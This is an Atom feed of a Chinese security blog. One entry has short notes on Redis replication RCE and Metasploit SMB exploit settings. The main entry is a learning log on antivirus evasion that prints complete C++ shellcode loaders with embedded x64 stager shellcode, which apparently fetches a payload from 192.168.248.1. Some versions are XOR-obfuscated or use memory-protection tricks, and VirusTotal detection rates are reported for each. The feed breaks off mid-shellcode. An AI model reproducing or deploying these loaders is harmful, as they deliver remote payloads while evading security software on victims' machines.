<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Polo&#39;s Blog</title>
  
  
  <link href="https://polosec.github.io/atom.xml" rel="self"/>
  
  <link href="https://polosec.github.io/"/>
  <updated>2022-01-09T09:53:56.290Z</updated>
  <id>https://polosec.github.io/</id>
  
  <author>
    <name>Polo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>redis主从复制/smb扫描备忘</title>
    <link href="https://polosec.github.io/2022/01/09/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-smb%E6%89%AB%E6%8F%8F%E5%A4%87%E5%BF%98/"/>
    <id>https://polosec.github.io/2022/01/09/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-smb%E6%89%AB%E6%8F%8F%E5%A4%87%E5%BF%98/</id>
    <published>2022-01-09T09:47:11.000Z</published>
    <updated>2022-01-09T09:53:56.290Z</updated>
    
    <content type="html"><![CDATA[<p>redis主从复制rce版本要求redis4.x或者5.x，6.x不可以。<br>msf利用smb漏洞时出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] Exploit failed: RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>时可调整参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set SMB::AlwaysEncrypt false</span><br><span class="line">set SMB::ProtocolVersion 1</span><br></pre></td></tr></table></figure><p>MSF搜索参数：-S 指定字符串 比如scanner， type指定模块类型。<img src="http://cdn.polowong.top/16417219897919u9naujv.png?imageslim" alt="paste image"><br>SMB漏洞利用：扫描端口，获得版本，利用漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;redis主从复制rce版本要求redis4.x或者5.x，6.x不可以。&lt;br&gt;msf利用smb漏洞时出现&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>菜鸡的0基础免杀学习记录</title>
    <link href="https://polosec.github.io/2021/12/02/%E8%8F%9C%E9%B8%A1%E7%9A%840%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://polosec.github.io/2021/12/02/%E8%8F%9C%E9%B8%A1%E7%9A%840%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2021-12-02T08:16:03.000Z</published>
    <updated>2021-12-02T08:22:54.320Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言</p><p>其实一直对免杀挺感兴趣的，但一直没有下定决心系统的学习，只是半路拿来别人写的过来用一下，所以这次想从最基本的方法开始学习免杀，作为一个记录贴将持续更新免杀方法、代码以及其中我没掌握的知识点。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://hack-for.fun/bd13.html">https://hack-for.fun/bd13.html</a></p><h1 id="windows-API-源码函数学习"><a href="#windows-API-源码函数学习" class="headerlink" title="windows API/源码函数学习"></a>windows API/源码函数学习</h1><h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  LPVOID lpAddress,内存基址</span><br><span class="line">  SIZE_T dwSize,大小</span><br><span class="line">  DWORD  flAllocationType,分配的类型</span><br><span class="line">  DWORD  flProtect 该内存的初始保护属性 RWX？</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="最简单直接加载shellcode"><a href="#最简单直接加载shellcode" class="headerlink" title="最简单直接加载shellcode"></a>最简单直接加载shellcode</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="comment">/* length: 892 bytes */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4f\x69\x42\x63\x00\x3b\xba\x07\xca\x0e\x71\x39\x4d\xf4\x73\xa0\x65\x60\xbc\x40\x25\xa0\x17\x51\xb3\xcc\xe5\x79\x2f\xfb\x20\x19\xa8\x1a\x58\x78\x64\x4e\xf7\x12\xef\x1d\x0e\xec\xe1\xf5\x65\x17\xc5\x2f\xe7\x82\xbb\x5e\x99\xa3\x50\x8b\x24\x8b\x9c\xf6\x14\xeb\x83\x4d\x85\x05\x85\x88\xf3\x0c\x81\xb1\x6a\x5a\x7d\x7b\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x53\x4c\x43\x43\x32\x3b\x20\x2e\x4e\x45\x54\x20\x43\x4c\x52\x20\x32\x2e\x30\x2e\x35\x30\x37\x32\x37\x29\x0d\x0a\x00\x69\x9b\xe0\x7e\xb2\xb6\x38\x6a\xbc\x63\x5e\xf9\x85\x9c\x22\x64\x17\x40\x5a\x37\x76\xe0\x60\x04\x54\xf3\x6a\x65\x0b\x6e\x1e\x90\x87\xb9\xeb\xf9\x85\x0b\x22\xd7\x64\x40\x7c\x76\x54\xd6\x27\x7c\x18\x2c\x97\x47\x5d\x0c\x53\x8e\xc8\xec\xcc\x00\xde\xfd\xe8\x67\x80\xbb\xe5\xc6\x61\x14\x13\x3c\x21\x4e\x06\xf9\xd9\x21\xa7\x9d\x4e\x63\xc8\x3b\xae\x6e\xf2\xe3\x58\x29\x14\x9a\xb1\xec\xdd\xc6\xe4\x62\xd0\x21\x7c\xe4\xcf\x21\x51\xfd\x16\x7f\xcd\xfe\x68\xdc\xda\x17\x1c\xf7\xab\x35\x79\x45\x31\x17\xf1\x30\xfd\xdd\x4f\xfd\x35\xcf\x94\xaa\xbd\xcb\x13\x48\xd3\xa5\x2f\xb8\x98\xed\x65\x54\x18\x35\xb2\x3c\x23\x1b\x8d\xb4\x0d\x62\xcf\xe1\x9b\x7b\xe7\x63\x2a\x86\x8d\x16\xe4\xda\xfb\xa4\x03\x4b\x8e\x1e\x03\x03\xa3\x4d\x11\x1d\x2a\xbb\xc9\xe1\xbf\xb0\xa5\x23\x0d\xd6\x6d\x34\x99\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x34\x38\x2e\x31\x00\x51\x09\xbf\x6d&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">    shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果-vt-21-65"><a href="#免杀效果-vt-21-65" class="headerlink" title="免杀效果 vt 21/65"></a>免杀效果 vt 21/65</h2><p>59b33f3b4a74e8930a5207bf209f961f45e5eef277c19553c8c5ad3fe203c20d</p><p><img src="http://cdn.polowong.top/image-20211129152638091.png" alt="image-20211129152638091"></p><h1 id="简单加载器-shellcode-XOR"><a href="#简单加载器-shellcode-XOR" class="headerlink" title="简单加载器+shellcode XOR"></a>简单加载器+shellcode XOR</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果-vt14-62"><a href="#免杀效果-vt14-62" class="headerlink" title="免杀效果  vt14/62"></a>免杀效果  vt14/62</h2><p>ac7eea68dbdf30730fb38ac43d0671c88aacdbcb7b8289740d69e8208923b2df</p><p><img src="http://cdn.polowong.top/image-20211202152221587.png" alt="image-20211202152221587"></p><h1 id="简单加载器-修改内存页属性-sleep-shellcode-xor异或"><a href="#简单加载器-修改内存页属性-sleep-shellcode-xor异或" class="headerlink" title="简单加载器+修改内存页属性+sleep+shellcode xor异或"></a>简单加载器+修改内存页属性+sleep+shellcode xor异或</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\